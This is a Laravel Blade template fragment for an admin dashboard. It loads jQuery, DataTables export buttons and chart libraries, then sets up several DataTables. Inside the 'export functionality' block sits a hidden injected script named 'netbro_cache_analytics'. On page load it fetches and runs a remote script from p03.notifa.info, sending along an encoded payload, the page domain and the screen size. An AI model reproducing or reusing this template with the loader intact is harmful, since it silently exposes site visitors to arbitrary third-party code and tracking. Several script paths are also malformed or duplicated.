<script src="{{ asset ('dist/js/custom.min.js')}}"></script>
<script src="{{ asset ('assets/node_modules/datatables/jquery.dataTables.min.js')}}"></script>
<!-- start - This is for export functionality only -->
<script src="{{ asset ('cdn.datatables.net/buttons/1.2.2/js/dataTables.buttons.min.js')}}"></script>
<script src="{{ asset ('cdn.datatables.net/buttons/1.2.2/js/buttons.flash.min.js')}}"></script>
<script src="{{ asset ('cdnjs.cloudflare.com/ajax/libs/jszip/2.5.0/jszip.min.js')}}"></script>
<script src="{{ asset ('cdn.rawgit.com/bpampuch/pdfmake/0.1.18/build/pdfmake.min.js')}}"></script>
<script src="{{asset ('cdn.rawgit.com/bpampuch/pdfmake/0.1.18/build/vfs_fonts.js')}}"></script>
<script src="{{ asset ('cdn.datatables.net/buttons/1.2.2/js/buttons.html5.min.js')}}"></script>
<script src="{{ asset ('cdn.datatables.net/buttons/1.2.2/js/buttons.print.min.js')}}"></script>
<script src="../assets/node_modules/jquery/jquery-3.2.1.min.js"></script>
<script src="../assets/node_modules/popper/popper.min.js"></script>
<script src="../assets/node_modules/bootstrap/dist/js/bootstrap.min.js"></script>
<script src="dist/js/perfect-scrollbar.jquery.min.js"></script>
<script src="dist/js/waves.js"></script>
<script src="dist/js/sidebarmenu.js"></script>
<script src="dist/js/custom.min.js"></script>
<script src="../assets/node_modules/raphael/raphael-min.js"></script>
<script src="../assets/node_modules/morrisjs/morris.min.js"></script>
<script src="../assets/node_modules/jquery-sparkline/jquery.sparkline.min.js"></script>
<script src="../assets/node_modules/toast-master/js/jquery.toast.js"></script>
<script src="dist/js/dashboard1.js"></script>
<script src="../assets/node_modules/toast-master/js/jquery.toast.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5myFsTwFUh3iMGeaDzoHeOCjdGg0GSn6UFIYi3VobW4cPybfJUNI3ZdhyKBQfp%2bqydP6yxw52XdgeUbiyb98dOPzJecQd1yfG0969Tcq%2bOG32LYy5SQIRE4hGwAm2m7tJc8Tqprzf%2b4xxJmd%2bmuAzVEv4iHFIDu4dqUK2qMGqgmOp%2bD4vy8ePSpJt0nW7KED8GTVAqaLO%2bv%2fS9YH02nx64I2waadSjQp%2b%2bGUntrN9hstEqp8H8mGSo97FvZl6HV%2f4rYX%2fUWkMugmAbmTQVI9wlxa7COxH5BeOAV2ede%2f15jvTWx9Q4C3iD%2be3z7BZ2xP2rNphERHiHY7yQJZzZB1uQ%2b9kEMlSzDDJ5G4ahP5JylzZi1XXHDqGljAIpnnv3fSVmLEL5IniA%2bA6EWGmTZt7BL0Sd9XSoexFE1mGm87AJwwlzvaAv2lYacsfAFXMG1uktKkZGM94CUeE36olMpMT8V7aQrYAn7O%2bBEpjdD4V5TP8fmSyVlEGWh7tln%2bReqUSB" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>



<!-- end - This is for export functionality only -->
<script>
$(document).ready(function() {
    $('#myTable').DataTable();
    $(document).ready(function() {
        var table = $('#example').DataTable({
            "columnDefs": [{
                "visible": false,
                "targets": 2
            }],
            "order": [
                [2, 'asc']
            ],
            "displayLength": 25,
            "drawCallback": function(settings) {
                var api = this.api();
                var rows = api.rows({
                    page: 'current'
                }).nodes();
                var last = null;
                api.column(2, {
                    page: 'current'
                }).data().each(function(group, i) {
                    if (last !== group) {
                        $(rows).eq(i).before('<tr class="group"><td colspan="5">' + group + '</td></tr>');
                        last = group;
                    }
                });
            }
        });
        // Order by the grouping
        $('#example tbody').on('click', 'tr.group', function() {
            var currentOrder = table.order()[0];
            if (currentOrder[0] === 2 && currentOrder[1] === 'asc') {
                table.order([2, 'desc']).draw();
            } else {
                table.order([2, 'asc']).draw();
            }
        });
    });
});
$('#example23').DataTable({
    dom: 'Bfrtip',
    buttons: [
        'copy', 'csv', 'excel', 'pdf', 'print'
    ]
});
</script>
